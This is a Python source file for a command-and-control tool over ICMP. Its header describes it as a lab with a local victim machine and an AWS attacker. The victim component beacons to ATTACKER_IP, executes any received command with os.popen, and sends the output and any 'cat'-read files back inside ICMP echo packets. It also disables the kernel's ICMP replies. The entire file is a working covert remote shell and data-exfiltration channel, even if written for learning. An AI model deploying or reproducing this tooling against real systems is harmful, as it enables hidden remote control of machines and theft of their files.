###############################################################
#  C&C over ICMP                                              #
#  using local computer as victim and AWS machine as attacker #
#  November 2023                                              #
###############################################################

#THINGS TO DO BEAFOR RUNNING:
# in the AWS machine we need to add Inbound rules (in the AWS web) 
# 1. AL ICMP- IPv4
# Change the "ATTACKER_IP" to AWS public IP 


from scapy.layers.inet import *
from scapy.all import *
from enum import Enum
import sys
import os

class handle(Enum):
    BEACON = 1
    COMMAND = 2
    FILE_TRANSFER = 3

BEACON_ID = 60417
COMMAND_ID = 60418
ACK_ID = 60419
FILE_TRANSFER_ID = 60420
ECHO_REQUEST = 8
ECHO_REPLAY = 0

SEQ_server = 0x2
SEQ_victim = 0x2
ICMP_MTU = 1200
ATTACKER_IP = " "   # AWS public IP


##################################################################################


class Attacker:
    def __init__(self):
        # block kernel from auto reply to icmp reqs
        try:
            os.system('echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all')
        except:
            print("[!] You need to run this with administrator privileges.")
            sys.exit()

    def __del__(self):
            os.system('echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all')
            sys.exit()

    def check_packet(self, pkt):
        # checks what packet is this and return the coresponding number
        global SEQ_server
        if pkt[0][ICMP].type == ECHO_REQUEST:
            if pkt[0][ICMP].id == BEACON_ID:
                return handle.BEACON
            if pkt[0][ICMP].id == COMMAND_ID:
                return handle.COMMAND
            if pkt[0][ICMP].id == FILE_TRANSFER_ID:
                return handle.FILE_TRANSFER
            else:
                return 0

    def beacon_handler(self, pkt):
        # send a command
        global SEQ_server
        command = command = input("(#) enter a command:\n(#)Type cat + file path to transfer a file\n(#) ")
        ret = pkt
        seq = 0x1 + SEQ_server
        while True:
            if not ret or ret[0][ICMP].id != ACK_ID:  
                s = send(IP(dst=pkt[0][IP].src)/ICMP(type=ECHO_REPLAY, id=BEACON_ID, seq=int(seq))/command, verbose=False)
            else:
                break
            ret = sniff(filter="icmp", count=1, timeout=2)
        SEQ_server = SEQ_server + 0x1
        return

    def answer_handler(self, pkt):
        global SEQ_server
        # takes an answer and print it to stdout
        for i in range(5):
            send(IP(dst=pkt[0][IP].src)/ICMP(type=ECHO_REPLAY, id=COMMAND_ID), verbose=False)
        SEQ_server = SEQ_server + 1
        return

    def file_transfer_handler(self, pkt, file_path):
        # recieve file and assemles it 
        # sniff all and handle them.
        global SEQ_server
        for i in range(5):
            send(IP(dst=pkt[0][IP].src)/ICMP(type=ECHO_REPLAY, id=FILE_TRANSFER_ID, seq=0x1), verbose=False)
        data = pkt[0][IP][Raw].load.decode('utf-8')
        file = open(file_path, "a+")
        file.write(data)
        file.close()
        SEQ_server = SEQ_server + 0x1
        return
    


##################################################################################


class Victim:
    def __init__(self):
        try:
            os.system('echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all')
        except:
            print("[!] You need to run this tool with administrator privileges.")
            sys.exit()

    def __del__(self):
        os.system('echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all')
        sys.exit()

    def check_packet(packet_info, pkt):
        # checks what packet is this and return the coresponding number
        global SEQ_victim
        if pkt[0][ICMP].type == 0 and pkt[0][ICMP].seq != SEQ_victim:
            if pkt[0][ICMP].id == BEACON_ID:
                return handle.BEACON
            if pkt[0][ICMP].id == COMMAND_ID:
                return handle.COMMAND
            if pkt[0][ICMP].id == FILE_TRANSFER_ID:
                return handle.FILE_TRANSFER
            else:
                return 0
                    
    def beacon(self):
        # send several icmp packets to c2 server
        for i in range(10):
            send(IP(dst=ATTACKER_IP)/ICMP(type=ECHO_REQUEST, id=BEACON_ID, seq=0x1), verbose=False)
        return
    
    def command_handler(self, pkt):
        # handel command and parse response to server
        #send ack
        for i in range(5):
            send(IP(dst=ATTACKER_IP)/ICMP(type=ECHO_REQUEST, id=ACK_ID, seq=0x1), verbose=False)
        global SEQ_victim
        seq = 0x1 + SEQ_victim
        #decode massege
        command = pkt[0][IP][Raw].load.decode('utf-8')
        res = os.popen(command).read()
        ret = pkt
        
        if command.split()[0] == "cat":
            id = FILE_TRANSFER_ID
            for i in range(0, len(res), ICMP_MTU):
                new_pkt = IP(dst=ATTACKER_IP)/ICMP(type=ECHO_REQUEST, id=id, seq=int(seq))/res[i:i+ICMP_MTU]
                while True:
                    if not ret or ret[0][ICMP].id != FILE_TRANSFER_ID:
                        send(new_pkt, verbose=False)
                        ret = sniff(filter="icmp", count=1, timeout=2)
                    else:
                        SEQ_victim =  SEQ_victim + 1
                        break 
        else:
            id = COMMAND_ID
            for i in range(0, len(res), ICMP_MTU):
                new_pkt = IP(dst=ATTACKER_IP)/ICMP(type=ECHO_REQUEST, id=id, seq=int(seq))/res[i:i+ICMP_MTU]
                while True:
                    if not ret or ret[0][ICMP].id != COMMAND_ID:
                        send(new_pkt, verbose=False)
                        ret = sniff(filter="icmp", count=1, timeout=2)
                    else:
                        SEQ_victim =  SEQ_victim + 1
                        break 
        return


##################################################################################

def main():
    position = input("Enter 'attacker' or 'victim' to choose position: ")
    if position == "attacker":
        print("(#) welcome Attacker")
        attacker = Attacker()
        while True:
            try:
                pkt = sniff(filter="icmp", count=1, prn=lambda x: x.summary())
                ret = attacker.check_packet(pkt)
                match ret:
                    case handle.BEACON:
                        attacker.beacon_handler(pkt)
                    case handle.COMMAND:
                        attacker.answer_handler(pkt)
                    case handle.FILE_TRANSFER:
                        attacker.file_transfer_handler(pkt, "./TRANSFERD_FILE.txt")
                    case _:
                        continue
            except KeyboardInterrupt:
                break
            
    else:
        victim = Victim()
        while True:
            try:
                victim.beacon()
                pkt = sniff(filter="icmp", count=1, timeout=10, prn=lambda x: x.summary())
                if pkt:
                    ret = victim.check_packet(pkt)
                    match ret:
                        case handle.BEACON:
                            victim.command_handler(pkt)
                        case _:
                            continue
            except KeyboardInterrupt:
                sys.exit()
    print("Exiting...!")


if __name__ == "__main__":
    main()
